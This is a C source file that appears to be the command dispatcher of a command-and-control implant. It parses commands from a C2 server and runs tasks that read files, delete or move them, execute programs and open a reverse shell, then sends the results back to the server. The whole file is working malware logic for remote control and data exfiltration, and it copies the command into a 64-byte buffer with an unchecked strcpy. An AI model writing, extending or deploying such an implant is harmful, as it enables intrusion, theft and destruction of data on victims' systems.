//
// Created by melo on 4/8/25.
//

#include "choice.h"
#include "tasks.h"
#include "connexion.h"
#include "base64.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void choice(char * buffer_fetch, char * user_ID) {
    // Variables for task handling
    char command[64] = {0};
    char *task_ID = NULL;
    char task_result[1024*1024] = {0}; // Buffer for task results

    // Check if there's a command to process
    if (buffer_fetch == NULL || strlen(buffer_fetch) == 0) {
        printf("No command received\n");
        return;
    }

    // Extract the command (first part before comma)
    char *buffer_copy = strdup(buffer_fetch);
    if (buffer_copy == NULL) {
        printf("Memory allocation error\n");
        return;
    }

    char *token = strtok(buffer_copy, ",");
    if (token != NULL) {
        strcpy(command, token);
    } else {
        printf("Invalid command format\n");
        free(buffer_copy);
        return;
    }
    free(buffer_copy);

    printf("Command received: %s\n", command);

    // Process command based on type
    if (strcmp(command, "SLEEP") == 0) {
        task_ID = sleep_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Sleep task completed, task ID: %s\n", task_ID);
        }
    }
    else if (strcmp(command, "CAT") == 0) {
        task_ID = cat_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Cat task completed, task ID: %s\n", task_ID);
            printf("Result length: %zu bytes\n", strlen(task_result));
        }
    }
    else if (strcmp(command, "RM") == 0) {
        task_ID = rm_task(buffer_fetch);
        if (task_ID != NULL) {
            printf("Remove task completed, task ID: %s\n", task_ID);
            task_result[0] = '\0'; // No results to send back
        }
    }
    else if (strcmp(command, "MV") == 0) {
        task_ID = mv_task(buffer_fetch);
        if (task_ID != NULL) {
            printf("Move task completed, task ID: %s\n", task_ID);
            task_result[0] = '\0'; // No results to send back
        }
    }
    else if (strcmp(command, "EXECVE") == 0) {
        task_ID = execve_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Execve task completed, task ID: %s\n", task_ID);
            printf("Result length: %zu bytes\n", strlen(task_result));
        }
    }
    else if (strcmp(command, "REVSHELL") == 0) {
        task_ID = revshell_task(buffer_fetch, task_result);
        if (task_ID != NULL) {
            printf("Reverse shell task initiated, task ID: %s\n", task_ID);
            task_result[0] = '\0'; // No results to send back
        }
    }
    else {
        printf("Unknown command: %s\n", command);
        return;
    }

    // Check if task execution was successful
    if (task_ID == NULL) {
        printf("Task execution failed\n");
        return;
    }

    // Send result back to C2 server
    int sock_result = sock_init();
    if (sock_result == -1) {
        printf("Failed to initialize socket for result\n");
        free(task_ID);
        return;
    }

    // Format result message: RESULT,USER_ID,TASK_ID,RESULT_DATA
    char *result_message = malloc(strlen(task_result) + 256);
    if (result_message == NULL) {
        printf("Memory allocation failed for result message\n");
        close(sock_result);
        free(task_ID);
        return;
    }

    sprintf(result_message, "RESULT,%s,%s,%s", user_ID, task_ID, task_result);

    // Send result to C2
    char response_buffer[1024] = {0};
    send_message(sock_result, result_message, response_buffer);
    printf("Result sent to C2, response: %s\n", response_buffer);

    // Cleanup
    close(sock_result);
    free(result_message);
    free(task_ID);
}